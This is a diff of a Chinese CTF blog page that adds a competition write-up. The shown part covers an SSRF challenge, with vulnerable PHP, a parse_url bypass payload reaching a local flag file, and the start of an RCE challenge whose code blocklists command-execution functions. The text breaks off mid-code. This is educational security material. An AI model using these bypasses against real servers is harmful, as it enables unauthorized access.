@@ -2,26 +2,22 @@
 <html>
 <head>
   <meta charset="utf-8">
-  <title>MIXBP</title>
-  <meta name="keywords" content="">
-  <meta name="description" content="MIXBP">
+  <title>“轩辕杯”云盾砺剑CTF挑战赛复现 | MIXBP</title>
+  <meta name="keywords" content=" ssti , ssrf , RCE , sql ">
+  <meta name="description" content="“轩辕杯”云盾砺剑CTF挑战赛复现 | MIXBP">
     <meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1">
-<meta name="description" content="NewStarCTF2023公开赛道-include0。0源码 12345678910&lt;?phphighlight_file(__FILE__);&#x2F;&#x2F; FLAG in the flag.php$file &#x3D; $_GET[&#x27;file&#x27;];if(isset($file) &amp;&amp; !preg_match(&#x27;&#x2F;base|rot&#x2F;i&#x27;,$file)">
 <meta property="og:type" content="article">
-<meta property="og:title" content="NewStarCTF2023公开赛道-include00">
-<meta property="og:url" content="https://mixbp.github.io/master/2025/05/20/NewStarCTF2023%E5%85%AC%E5%BC%80%E8%B5%9B%E9%81%93-include00/index.html">
+<meta property="og:title" content="CISCN2024-WEB-easycms">
+<meta property="og:url" content="https://mixbp.github.io/master/2025/05/25/CISCN2024-WEB-easycms/index.html">
 <meta property="og:site_name" content="MIXBP">
-<meta property="og:description" content="NewStarCTF2023公开赛道-include0。0源码 12345678910&lt;?phphighlight_file(__FILE__);&#x2F;&#x2F; FLAG in the flag.php$file &#x3D; $_GET[&#x27;file&#x27;];if(isset($file) &amp;&amp; !preg_match(&#x27;&#x2F;base|rot&#x2F;i&#x27;,$file)">
 <meta property="og:locale" content="en_US">
-<meta property="og:image" content="https://mixbp.github.io/image/NewStarCTF2023%E5%85%AC%E5%BC%80%E8%B5%9B%E9%81%93-include00-1.png">
-<meta property="article:published_time" content="2025-05-20T10:37:34.000Z">
-<meta property="article:modified_time" content="2025-05-20T13:45:59.925Z">
+<meta property="article:published_time" content="2025-05-25T11:56:05.000Z">
+<meta property="article:modified_time" content="2025-05-25T11:57:40.600Z">
 <meta property="article:author" content="MIXBP">
-<meta property="article:tag" content="php伪协议">
-<meta property="article:tag" content="filter伪协议变种">
-<meta property="article:tag" content="二次编码绕过">
+<meta property="article:tag" content="ssrf">
+<meta property="article:tag" content="302跳转">
+<meta property="article:tag" content="反弹shell">
 <meta name="twitter:card" content="summary">
-<meta name="twitter:image" content="https://mixbp.github.io/image/NewStarCTF2023%E5%85%AC%E5%BC%80%E8%B5%9B%E9%81%93-include00-1.png">
 
 
 <link rel="icon" href="/img/avatar.jpg">
@@ -59,7 +55,7 @@
 
 
 <body>
-<aside class="nav mobile">
+<aside class="nav">
     <div class="nav-left">
         <a href="/"
    class="avatar_target">
@@ -120,7 +116,7 @@
     <li>
         <div class="all active" data-rel="All">All
             
-                <small>(139)</small>
+                <small>(145)</small>
             
         </div>
     </li>
@@ -147,7 +143,7 @@
         <div data-rel="刷题笔记">
             
             刷题笔记
-            <small>(22)</small>
+            <small>(27)</small>
         </div>
         
     </li>
@@ -162,7 +158,7 @@
         <div data-rel="比赛复现">
             
             比赛复现
-            <small>(5)</small>
+            <small>(6)</small>
         </div>
         
     </li>
@@ -200,8 +196,8 @@
         
     </div>
 </div>
-<input type="hidden" id="yelog_site_posts_number" value="139">
-<input type="hidden" id="yelog_site_word_count" value="239.4k">
+<input type="hidden" id="yelog_site_posts_number" value="145">
+<input type="hidden" id="yelog_site_word_count" value="246.7k">
 <div style="display: none">
     <span id="busuanzi_value_site_uv"></span>
     <span id="busuanzi_value_site_pv"></span>
@@ -255,7 +251,11 @@
             </li>
         
             <li class="article-tag-list-item">
-                <i class="iconfont icon-tag"></i><a>.htaccess</a>
+                <i class="iconfont icon-tag"></i><a>.htaccess利用</a>
+            </li>
+        
+            <li class="article-tag-list-item">
+                <i class="iconfont icon-tag"></i><a>.htaccess配置prce绕过正则匹配</a>
             </li>
         
             <li class="article-tag-list-item">
@@ -292,6 +292,10 @@
         
             <li class="article-tag-list-item">
                 <i class="iconfont icon-tag"></i><a>16进制加SQL预处理绕过</a>
+            </li>
+        
+            <li class="article-tag-list-item">
+                <i class="iconfont icon-tag"></i><a>302跳转</a>
             </li>
         
             <li class="article-tag-list-item">
@@ -375,6 +379,14 @@
             </li>
         
             <li class="article-tag-list-item">
+                <i class="iconfont icon-tag"></i><a>环境变量</a>
+            </li>
+        
+            <li class="article-tag-list-item">
+                <i class="iconfont icon-tag"></i><a>截断绕过</a>
+            </li>
+        
+            <li class="article-tag-list-item">
                 <i class="iconfont icon-tag"></i><a>经典盲文</a>
             </li>
         
@@ -427,6 +439,10 @@
             </li>
         
             <li class="article-tag-list-item">
+                <i class="iconfont icon-tag"></i><a>任意文件读取</a>
+            </li>
+        
+            <li class="article-tag-list-item">
                 <i class="iconfont icon-tag"></i><a>任意文件下载</a>
             </li>
         
@@ -468,6 +484,10 @@
         
             <li class="article-tag-list-item">
                 <i class="iconfont icon-tag"></i><a>双大括号过滤</a>
+            </li>
+        
+            <li class="article-tag-list-item">
+                <i class="iconfont icon-tag"></i><a>双写绕过../过滤</a>
             </li>
         
             <li class="article-tag-list-item">
@@ -583,6 +603,10 @@
             </li>
         
             <li class="article-tag-list-item">
+                <i class="iconfont icon-tag"></i><a>长度限制绕过</a>
+            </li>
+        
+            <li class="article-tag-list-item">
                 <i class="iconfont icon-tag"></i><a>正则表达式</a>
             </li>
         
@@ -695,6 +719,10 @@
             </li>
         
             <li class="article-tag-list-item">
+                <i class="iconfont icon-tag"></i><a>error_log结合log_errors自定义错误日志</a>
+            </li>
+        
+            <li class="article-tag-list-item">
                 <i class="iconfont icon-tag"></i><a>Error/Exception</a>
             </li>
         
@@ -772,6 +800,14 @@
         
             <li class="article-tag-list-item">
                 <i class="iconfont icon-tag"></i><a>handler读表</a>
+            </li>
+        
+            <li class="article-tag-list-item">
+                <i class="iconfont icon-tag"></i><a>hash_hmac绕过</a>
+            </li>
+        
+            <li class="article-tag-list-item">
+                <i class="iconfont icon-tag"></i><a>hex编码绕过</a>
             </li>
         
             <li class="article-tag-list-item">
@@ -863,6 +899,10 @@
             </li>
         
             <li class="article-tag-list-item">
+                <i class="iconfont icon-tag"></i><a>mysql</a>
+            </li>
+        
+            <li class="article-tag-list-item">
                 <i class="iconfont icon-tag"></i><a>MySQL</a>
             </li>
         
@@ -924,6 +964,10 @@
         
             <li class="article-tag-list-item">
                 <i class="iconfont icon-tag"></i><a>PHP_SESSION_UPLOAD_PROGRESS</a>
+            </li>
+        
+            <li class="article-tag-list-item">
+                <i class="iconfont icon-tag"></i><a>php-r</a>
             </li>
         
             <li class="article-tag-list-item">
@@ -1076,6 +1120,10 @@
         
             <li class="article-tag-list-item">
                 <i class="iconfont icon-tag"></i><a>SoapClient类进行SSRF</a>
+            </li>
+        
+            <li class="article-tag-list-item">
+                <i class="iconfont icon-tag"></i><a>sql</a>
             </li>
         
             <li class="article-tag-list-item">
@@ -1239,8 +1287,62 @@
         
         
         <a  class="All 刷题笔记 "
+           href="/2025/05/25/CISCN2024-WEB-easycms/"
+           data-tag="ssrf,302跳转,反弹shell"
+           data-author="" >
+            <span class="post-title" title="CISCN2024-WEB-easycms">CISCN2024-WEB-easycms</span>
+            <span class="post-date" title="2025-05-25 19:56:05">2025/05/25</span>
+        </a>
+        
+        
+        <a  class="All 刷题笔记 "
+           href="/2025/05/23/%E7%BE%8A%E5%9F%8E%E6%9D%AF2020-Blackcat/"
+           data-tag="代码审计,RCE,环境变量,hash_hmac绕过"
+           data-author="" >
+            <span class="post-title" title="羊城杯2020-Blackcat">羊城杯2020-Blackcat</span>
+            <span class="post-date" title="2025-05-23 20:50:09">2025/05/23</span>
+        </a>
+        
+        
+        <a  class="All 比赛复现 "
+           href="/2025/05/22/%E2%80%9C%E8%BD%A9%E8%BE%95%E6%9D%AF%E2%80%9D%E4%BA%91%E7%9B%BE%E7%A0%BA%E5%89%91CTF%E6%8C%91%E6%88%98%E8%B5%9B%E5%A4%8D%E7%8E%B0/"
+           data-tag="ssti,ssrf,RCE,sql"
+           data-author="" >
+            <span class="post-title" title="“轩辕杯”云盾砺剑CTF挑战赛复现">“轩辕杯”云盾砺剑CTF挑战赛复现</span>
+            <span class="post-date" title="2025-05-22 23:37:59">2025/05/22</span>
+        </a>
+        
+        
+        <a  class="All 刷题笔记 "
+           href="/2025/05/22/NESTCTF2019-LoveMath2/"
+           data-tag="RCE,长度限制绕过,异或绕过"
+           data-author="" >
+            <span class="post-title" title="NESTCTF2019-LoveMath2">NESTCTF2019-LoveMath2</span>
+            <span class="post-date" title="2025-05-22 20:28:03">2025/05/22</span>
+        </a>
+        
+        
+        <a  class="All 刷题笔记 "
+           href="/2025/05/21/virink-2019-files-share/"
+           data-tag="任意文件读取,双写绕过../过滤"
+           data-author="" >
+            <span class="post-title" title="virink_2019_files_share">virink_2019_files_share</span>
+            <span class="post-date" title="2025-05-21 21:42:07">2025/05/21</span>
+        </a>
+        
+        
+        <a  class="All 刷题笔记 "
+           href="/2025/05/21/CISCN2024-WEB-simple-php/"
+           data-tag="反弹shell,php-r,截断绕过,hex编码绕过,session文件包含,mysql"
+           data-author="" >
+            <span class="post-title" title="CISCN2024-WEB-simple_php">CISCN2024-WEB-simple_php</span>
+            <span class="post-date" title="2025-05-21 20:42:58">2025/05/21</span>
+        </a>
+        
+        
+        <a  class="All 刷题笔记 "
            href="/2025/05/20/XNUCA2019Qualifier-EasyPHP/"
-           data-tag=".htaccess"
+           data-tag=".htaccess利用,error_log结合log_errors自定义错误日志,.htaccess配置prce绕过正则匹配"
            data-author="" >
             <span class="post-title" title="XNUCA2019Qualifier-EasyPHP">XNUCA2019Qualifier-EasyPHP</span>
             <span class="post-date" title="2025-05-20 21:42:14">2025/05/20</span>
@@ -1267,7 +1369,7 @@
         
         <a  class="All 刷题笔记 "
            href="/2025/05/20/%E7%BE%8A%E5%9F%8E%E6%9D%AF2020-Easyphp2/"
-           data-tag="文件包含,php代码审计,getshell,php伪协议,二次编码绕过,提权"
+           data-tag="文件包含,getshell,php代码审计,php伪协议,二次编码绕过,提权"
            data-author="" >
             <span class="post-title" title="羊城杯2020-Easyphp2">羊城杯2020-Easyphp2</span>
             <span class="post-date" title="2025-05-20 17:39:03">2025/05/20</span>
@@ -1276,7 +1378,7 @@
         
         <a  class="All 刷题笔记 "
            href="/2025/05/20/watevrCTF-2019-PickleStore/"
-           data-tag="python反序列化,外带数据,pickle反序列化,反弹shell"
+           data-tag="python反序列化,反弹shell,外带数据,pickle反序列化"
            data-author="" >
             <span class="post-title" title="watevrCTF-2019-PickleStore">watevrCTF-2019-PickleStore</span>
             <span class="post-date" title="2025-05-20 16:38:08">2025/05/20</span>
@@ -1492,7 +1594,7 @@
         
         <a  class="All "
            href="/2025/04/25/N1CTF2018-eating-cms/"
-           data-tag="代码审计,文件包含,信息搜集,文件上传,rce,parse_url绕过,parse_str绕过"
+           data-tag="代码审计,信息搜集,文件包含,文件上传,rce,parse_url绕过,parse_str绕过"
            data-author="" >
             <span class="post-title" title="N1CTF2018-eating_cms">N1CTF2018-eating_cms</span>
             <span class="post-date" title="2025-04-25 20:43:52">2025/04/25</span>
@@ -1600,7 +1702,7 @@
         
         <a  class="All "
            href="/2025/04/19/MakePHPGreatAgain/"
-           data-tag="require_once,session文件包含,PHP_SESSION_UPLOAD_PROGRESS,条件竞争"
+           data-tag="session文件包含,require_once,PHP_SESSION_UPLOAD_PROGRESS,条件竞争"
            data-author="" >
             <span class="post-title" title="MakePHPGreatAgain">MakePHPGreatAgain</span>
             <span class="post-date" title="2025-04-19 20:29:51">2025/04/19</span>
@@ -1663,7 +1765,7 @@
         
         <a  class="All "
            href="/2025/04/15/BJDCTF2020-EzPHP/"
-           data-tag="刷题笔记,php特性,代码审计,sha1绕过,extract,$_SERVER[&#39;QUERY_STRING&#39;],preg_match,create_function(),取反绕过单双引号过滤"
+           data-tag="刷题笔记,代码审计,php特性,sha1绕过,extract,$_SERVER[&#39;QUERY_STRING&#39;],preg_match,create_function(),取反绕过单双引号过滤"
            data-author="" >
             <span class="post-title" title="BJDCTF2020-EzPHP">BJDCTF2020-EzPHP</span>
             <span class="post-date" title="2025-04-15 22:02:22">2025/04/15</span>
@@ -1681,7 +1783,7 @@
         
         <a  class="All 比赛复现 "
            href="/2025/04/15/TGCTF-2025%E5%A4%8D%E7%8E%B0/"
-           data-tag="sql注入,upload,时间盲注,RCE,CVE,目录穿越,内存马,明文攻击,压缩文件修复,时间帧隐写,docker"
+           data-tag="sql注入,upload,RCE,时间盲注,CVE,目录穿越,内存马,明文攻击,压缩文件修复,时间帧隐写,docker"
            data-author="" >
             <span class="post-title" title="TGCTF-2025复现">TGCTF-2025复现</span>
             <span class="post-date" title="2025-04-15 14:10:07">2025/04/15</span>
@@ -1717,7 +1819,7 @@
         
         <a  class="All "
            href="/2025/04/14/SUCTF2019-EasyWeb/"
-           data-tag="文件上传,.haccess,无字母数字RCE,异或绕过"
+           data-tag="文件上传,异或绕过,.haccess,无字母数字RCE"
            data-author="" >
             <span class="post-title" title="SUCTF2019-EasyWeb">SUCTF2019-EasyWeb</span>
             <span class="post-date" title="2025-04-14 17:33:10">2025/04/14</span>
@@ -1924,7 +2026,7 @@
         
         <a  class="All "
            href="/2025/03/30/BJDCTF2020-EasySearch1/"
-           data-tag="刷题笔记,代码审计,swp泄露,md5碰撞,Apache SSI 远程命令执行漏洞"
+           data-tag="刷题笔记,swp泄露,md5碰撞,代码审计,Apache SSI 远程命令执行漏洞"
            data-author="" >
             <span class="post-title" title="BJDCTF2020-EasySearch1">BJDCTF2020-EasySearch1</span>
             <span class="post-date" title="2025-03-30 14:24:01">2025/03/30</span>
@@ -1960,7 +2062,7 @@
         
         <a  class="All "
            href="/2025/03/29/%E6%9E%81%E5%AE%A2%E5%A4%A7%E6%8C%91%E6%88%982019-RCE-ME/"
-           data-tag="刷题笔记,无字母数字RCE,异或绕过,取反绕过"
+           data-tag="刷题笔记,异或绕过,无字母数字RCE,取反绕过"
            data-author="" >
             <span class="post-title" title="极客大挑战2019-RCE-ME">极客大挑战2019-RCE-ME</span>
             <span class="post-date" title="2025-03-29 01:33:00">2025/03/29</span>
@@ -2140,7 +2242,7 @@
         
         <a  class="All "
            href="/2025/03/20/%E7%BD%91%E9%BC%8E%E6%9D%AF2018Fakebook1/"
-           data-tag="刷题笔记,sql注入,php反序列化,ssrf"
+           data-tag="刷题笔记,sql注入,ssrf,php反序列化"
            data-author="" >
             <span class="post-title" title="网鼎杯2018Fakebook1">网鼎杯2018Fakebook1</span>
             <span class="post-date" title="2025-03-20 23:53:35">2025/03/20</span>
@@ -2498,18 +2600,83 @@
 
     </div>
     <div class="hide-list">
-        <div class="semicircle" data-title="切换全屏 快捷键 s">
+        <div class="semicircle" data-title="Toggle full screen shortcut key s">
             <div class="brackets first"><</div>
             <div class="brackets">&gt;</div>
         </div>
     </div>
 </aside>
-<div id="post" class="index">
+<div id="post">
     <div class="pjax">
-        <article class="index">
-            <div class="toc-ref">
+        <article id="post-“轩辕杯”云盾砺剑CTF挑战赛复现" class="article article-type-post" itemscope itemprop="blogPost">
     
-        <ol class="toc"><li class="toc-item toc-level-2"><a class="toc-link" href="#%E5%AF%B9%E5%8D%9A%E5%AE%A2%E7%9A%84%E7%90%86%E8%A7%A3"><span class="toc-text">对博客的理解</span></a></li></ol>
+        <h1 class="article-title">“轩辕杯”云盾砺剑CTF挑战赛复现</h1>
+    
+    <div class="article-meta">
+        
+        
+        
+        <span class="book">
+            <i class="iconfont icon-category"></i>
+            
+            
+            <a  data-rel="比赛复现">比赛复现</a>
+            
+        </span>
+        
+        
+        <span class="tag">
+            <i class="iconfont icon-tag"></i>
+            
+            <a class="color5">ssti</a>
+            
+            <a class="color5">ssrf</a>
+            
+            <a class="color4">RCE</a>
+            
+            <a class="color4">sql</a>
+            
+        </span>
+        
+    </div>
+    <div class="article-meta">
+        
+            Created At : <time class="date" title='Updated At: 2025-05-23 00:25:05'>2025-05-22 23:37</time>
+        
+    </div>
+    <div class="article-meta">
+        
+        <span>Count:1.4k</span>
+        
+        
+        <span id="busuanzi_container_page_pv">
+            Views 👀 :<span id="busuanzi_value_page_pv">
+                <span class="count-comment">
+                    <span class="spinner">
+                      <div class="cube1"></div>
+                      <div class="cube2"></div>
+                    </span>
+                </span>
+            </span>
+        </span>
+        
+        
+        <span class="top-comment" title="Jump to comment area">
+            <a href="#comments">
+                Comment:<span class="count-comment">
+                    <span class="spinner">
+                      <div class="cube1"></div>
+                      <div class="cube2"></div>
+                    </span>
+                </span>
+            </a>
+        </span>
+        
+    </div>
+    
+    <div class="toc-ref">
+    
+        <ol class="toc"><li class="toc-item toc-level-1"><a class="toc-link" href="#%E2%80%9C%E8%BD%A9%E8%BE%95%E6%9D%AF%E2%80%9D%E4%BA%91%E7%9B%BE%E7%A0%BA%E5%89%91CTF%E6%8C%91%E6%88%98%E8%B5%9B%E5%A4%8D%E7%8E%B0"><span class="toc-text">“轩辕杯”云盾砺剑CTF挑战赛复现</span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#WEB"><span class="toc-text">WEB</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#ezssrf1-0"><span class="toc-text">ezssrf1.0</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#pares-url"><span class="toc-text">pares_url</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#ezrce"><span class="toc-text">ezrce</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#readgzfile"><span class="toc-text">readgzfile</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#ezflask"><span class="toc-text">ezflask</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#ezsql1-0"><span class="toc-text">ezsql1.0</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#ez-web1"><span class="toc-text">ez_web1</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#proc"><span class="toc-text">proc</span></a></li></ol></li></ol></li></ol>
     
 <style>
     .left-col .switch-btn,
@@ -2522,11 +2689,114 @@
     }
 </style>
 </div>
-            <h2 id="对博客的理解"><a href="#对博客的理解" class="headerlink" title="对博客的理解"></a>对博客的理解</h2><p><strong>欢迎来到我博客，啥也没有随便看看吧</strong></p>
+    
+    <div class="article-entry" itemprop="articleBody">
+      
+        <h1 id="“轩辕杯”云盾砺剑CTF挑战赛复现"><a href="#“轩辕杯”云盾砺剑CTF挑战赛复现" class="headerlink" title="“轩辕杯”云盾砺剑CTF挑战赛复现"></a>“轩辕杯”云盾砺剑CTF挑战赛复现</h1><h1 id="WEB"><a href="#WEB" class="headerlink" title="WEB"></a>WEB</h1><h2 id="ezssrf1-0"><a href="#ezssrf1-0" class="headerlink" title="ezssrf1.0"></a><strong>ezssrf1.0</strong></h2><p>源码：</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span><br><span class="hljs-title function_ invoke__">error_reporting</span>(<span class="hljs-number">0</span>);<br><span class="hljs-title function_ invoke__">highlight_file</span>(<span class="hljs-keyword">__FILE__</span>);<br><span class="hljs-variable">$url</span> = <span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;url&#x27;</span>];<br><br><span class="hljs-keyword">if</span> (<span class="hljs-variable">$url</span> == <span class="hljs-literal">null</span>)<br>    <span class="hljs-keyword">die</span>(<span class="hljs-string">&quot;Try to add ?url=xxxx.&quot;</span>);<br><br><span class="hljs-variable">$x</span> = <span class="hljs-title function_ invoke__">parse_url</span>(<span class="hljs-variable">$url</span>);<br><br><span class="hljs-keyword">if</span> (!<span class="hljs-variable">$x</span>)<br>    <span class="hljs-keyword">die</span>(<span class="hljs-string">&quot;(;_;)&quot;</span>);<br><br><span class="hljs-keyword">if</span> (<span class="hljs-variable">$x</span>[<span class="hljs-string">&#x27;host&#x27;</span>] === <span class="hljs-literal">null</span> &amp;&amp; <span class="hljs-variable">$x</span>[<span class="hljs-string">&#x27;scheme&#x27;</span>] === <span class="hljs-string">&#x27;http&#x27;</span>) &#123;<br>    <span class="hljs-keyword">echo</span> (<span class="hljs-string">&#x27;Well, Going to &#x27;</span> . <span class="hljs-variable">$url</span>);<br>    <span class="hljs-variable">$ch</span> = <span class="hljs-title function_ invoke__">curl_init</span>(<span class="hljs-variable">$url</span>);<br>    <span class="hljs-title function_ invoke__">curl_setopt</span>(<span class="hljs-variable">$ch</span>, CURLOPT_HEADER, <span class="hljs-number">0</span>);<br>    <span class="hljs-title function_ invoke__">curl_setopt</span>(<span class="hljs-variable">$ch</span>, CURLOPT_RETURNTRANSFER, <span class="hljs-number">1</span>);<br>    <span class="hljs-variable">$result</span> = <span class="hljs-title function_ invoke__">curl_exec</span>(<span class="hljs-variable">$ch</span>);<br>    <span class="hljs-title function_ invoke__">curl_close</span>(<span class="hljs-variable">$ch</span>);<br>    <span class="hljs-keyword">echo</span> (<span class="hljs-variable">$result</span>);<br>&#125; <span class="hljs-keyword">else</span><br>    <span class="hljs-keyword">echo</span> <span class="hljs-string">&quot;(^-＿-^)&quot;</span>;<br>Try to add ?url=xxxx.<br></code></pre></td></tr></table></figure>
 
-        </article>
-        
-        
+<p>这题主要考的是parse_url函数的特性</p>
+<h3 id="pares-url"><a href="#pares-url" class="headerlink" title="pares_url"></a>pares_url</h3><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><code class="hljs php">Example <span class="hljs-comment">#1 parse_url() 例子</span><br><span class="hljs-meta">&lt;?php</span><br><span class="hljs-variable">$url</span> = <span class="hljs-string">&#x27;http://username:password@hostname/path?arg=value#anchor&#x27;</span>;<br><span class="hljs-title function_ invoke__">print_r</span>(<span class="hljs-title function_ invoke__">parse_url</span>(<span class="hljs-variable">$url</span>));<br><span class="hljs-meta">?&gt;</span><br>以上例程会输出：<br><span class="hljs-title function_ invoke__">Array</span><br>(<br>[scheme] =&gt; http<br>[host] =&gt; hostname<br>[user] =&gt; username<br>[pass] =&gt; password<br>[path] =&gt; /path<br>[query] =&gt; arg=value<br>[fragment] =&gt; anchor<br>)<br></code></pre></td></tr></table></figure>
+
+<hr>
+<p>这题需要我们传入url然后使parse_url解析之后的host为null，scheme为http。</p>
+<p>只需要将http:&#x2F;&#x2F;后的两个斜杠改为一个即可</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span><br><span class="hljs-variable">$url</span> = <span class="hljs-string">&#x27;http:/127.0.0.1/flag&#x27;</span>;<br><span class="hljs-title function_ invoke__">print_r</span>(<span class="hljs-title function_ invoke__">parse_url</span>(<span class="hljs-variable">$url</span>));<br><span class="hljs-meta">?&gt;</span><br><br><span class="hljs-comment">#</span><br><span class="hljs-title function_ invoke__">Array</span><br>(<br>    [scheme] =&gt; http<br>    [path] =&gt; /<span class="hljs-number">127.0</span>.<span class="hljs-number">0.1</span>/flag<br>)<br></code></pre></td></tr></table></figure>
+
+<p>payload：</p>
+<figure class="highlight avrasm"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs avrasm">?url=http:/<span class="hljs-number">127.0</span><span class="hljs-number">.0</span><span class="hljs-number">.1</span>/FFFFF11111AAAAAggggg.php<br>或者<br><span class="hljs-symbol">http:</span><span class="hljs-subst">@127</span><span class="hljs-number">.0</span><span class="hljs-number">.1</span>/FFFFF11111AAAAAggggg.php<br></code></pre></td></tr></table></figure>
+
+<hr>
+<h2 id="ezrce"><a href="#ezrce" class="headerlink" title="ezrce"></a>ezrce</h2><p>源码</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span><br><span class="hljs-title function_ invoke__">error_reporting</span>(<span class="hljs-number">0</span>);<br><span class="hljs-title function_ invoke__">highlight_file</span>(<span class="hljs-keyword">__FILE__</span>);<br><br><span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">waf</span>(<span class="hljs-params"><span class="hljs-variable">$a</span></span>) </span>&#123;<br>    <span class="hljs-variable">$disable_fun</span> = <span class="hljs-keyword">array</span>(<br>        <span class="hljs-string">&quot;exec&quot;</span>, <span class="hljs-string">&quot;shell_exec&quot;</span>, <span class="hljs-string">&quot;system&quot;</span>, <span class="hljs-string">&quot;passthru&quot;</span>, <span class="hljs-string">&quot;proc_open&quot;</span>, <span class="hljs-string">&quot;show_source&quot;</span>, <br>        <span class="hljs-string">&quot;phpinfo&quot;</span>, <span class="hljs-string">&quot;popen&quot;</span>, <span class="hljs-string">&quot;dl&quot;</span>, <span class="hljs-string">&quot;proc_terminate&quot;</span>, <span class="hljs-string">&quot;touch&quot;</span>, <span class="hljs-string">&quot;escapeshellcmd&quot;</span>, <br>        <span class="hljs-string">&quot;escapeshellarg&quot;</span>, <span class="hljs-string">&quot;assert&quot;</span>, <span class="hljs-string">&quot;substr_replace&quot;</span>, <span class="hljs-string">&quot;call_user_func_array&quot;</span>, <br>        <span class="hljs-string">&quot;call_user_func&quot;</span>, <span class="hljs-string">&quot;array_filter&quot;</span>, <span class="hljs-string">&quot;array_walk&quot;</span>, <span class="hljs-string">&quot;array_map&quot;</span>, <br>        <span class="hljs-string">&quot;register_shutdown_function&quot;</span>, <span class="hljs-string">&quot;register_tick_function&quot;</span>, <span class="hljs-string">&quot;filter_var&quot;</span>, <br>        <span class="hljs-string">&quot;filter_var_array&quot;</span>, <span class="hljs-string">&quot;uasort&quot;</span>, <span class="hljs-string">&quot;uksort&quot;</span>, <span class="hljs-string">&quot;array_reduce&quot;</span>, <span class="hljs-string">&quot;array_walk&quot;</span>, <br>        <span class="hljs-string">&quot;array_walk_recursive&quot;</span>, <span class="hljs-string">&quot;pcntl_exec&quot;</span>, <span class="hljs-string">&quot;fopen&quot;</span>, <span class="hljs-string">&quot;fwrite&quot;</span>, <br>        <span class="hljs-string">&quot;file_put_contents&quot;</span>, <span class="hljs-string">&quot;readfile&quot;</span>, <span class="hljs-string">&quot;file_get_contents&quot;</span>, <span class="hljs-string">&quot;highlight_file&quot;</span>, <span class="hljs-string">&quot;eval&quot;</span><br>    );<br>    <br>    <span class="hljs-variable">$disable_fun</span> = <span class="hljs-title function_ invoke__">array_map</span>(<span class="hljs-string">&#x27;strtolower&#x27;</span>, <span class="hljs-variable">$disable_fun</span>);<br>    <span class="hljs-variable">$a</span> = <span class="hljs-title function_ invoke__">strtolower</span>(<span class="hljs-variable">$a</span>);<br><br>    <span class="hljs-keyword">if</span> (<span class="hljs-title function_ invoke__">in_array</span>(<span class="hljs-variable">$a</span>, <span class="hljs-variable">$disable_fun</span>)) &#123;<br>        <span class="hljs-keyword">echo</span> <span class="hljs-string">&quot;宝宝这对嘛,这不对噢&quot;</span>;<br>        <span class="hljs-keyword">return</span> <span class="hljs-literal">false</span>;<br>    &#125;<br>    <span class="hljs-keyword">return</span> <span class="hljs-variable">$a</span>;<br>&#125;<br><br><span class="hljs-variable">$num</span> = <span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;num&#x27;</span>];<br><span class="hljs-variable">$new</span> = <span class="hljs-variable">$_POST</span>[<span class="hljs-string">&#x27;new&#x27;</span>];<br><span class="hljs-variable">$star</span> = <span class="hljs-variable">$_POST</span>[<span class="hljs-string">&#x27;star&#x27;</span>];<br><br><span class="hljs-keyword">if</span> (<span class="hljs-keyword">isset</span>(<span class="hljs-variable">$num</span>) &amp;&amp; <span 